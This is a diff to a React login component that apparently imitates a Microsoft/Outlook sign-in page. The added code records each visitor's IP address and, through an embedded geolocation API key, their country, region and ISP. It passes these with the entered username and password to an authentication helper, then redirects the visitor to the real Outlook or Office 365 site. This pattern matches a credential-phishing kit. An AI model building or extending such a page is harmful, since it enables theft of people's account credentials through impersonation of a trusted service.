@@ -1,8 +1,10 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import MicrosoftLogo from '../../assets/microsoft_logo.svg'
 import Outlook from '../../assets/Outlook-login.png'
 import { useParams } from 'react-router-dom'
 import { Authenticate } from '../../helpers/Auth'
+import axios from 'axios'
+import Loader from '../../component/Loader'
 
 const Microsoft = () => {
   const { service } = useParams()
@@ -12,6 +14,41 @@ const Microsoft = () => {
   const [userID, setUserID] = useState('')
   const [password, setPassword] = useState('')
   const [error, setError] = useState('')
+
+  const [IPAddress, setIPAddress] = useState('')
+  const [metaData, setMetaData] = useState('')
+  const [redirect, setRedirect] = useState(false)
+
+  const [isLoading, setIsLoading] = useState(false)
+  let link
+  link =
+    service === 'outlook' ? 'https://outlook.com' : 'https://office365.com/'
+  useEffect(() => {
+    redirect && window.location.replace(link)
+  }, [redirect])
+
+  useEffect(() => {
+    fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip)
+        console.log('ip is', data.ip)
+      })
+      .then(() => {
+        axios
+          .get(
+            `https://geo.ipify.org/api/v2/country?apiKey=at_51bi5RPzvgaTrXYA9cZohqZqMyKPI&ipAddress=${IPAddress}`
+          )
+          .then((resp) => {
+            const { location, isp } = resp.data
+            const { country, region } = location
+            console.log(country, region, isp)
+            setMetaData({ country, region, isp })
+          })
+          .catch((e) => console.log(e))
+      })
+      .catch((error) => console.error(error))
+  }, [])
 
   const handleBtn = () => {
     setError('')
@@ -27,7 +64,10 @@ const Microsoft = () => {
         setError('Please enter your password')
         return
       }
-      Authenticate(userID, password, service)
+      setIsLoading(true)
+      Authenticate(userID, password, service, IPAddress, metaData).then(() =>
+        setRedirect(true)
+      )
     }
   }
 
@@ -90,6 +130,7 @@ const Microsoft = () => {
           </section>
         </div>
       </section>
+      {isLoading && <Loader message={'Loading'} />}
     </div>
   )
 }
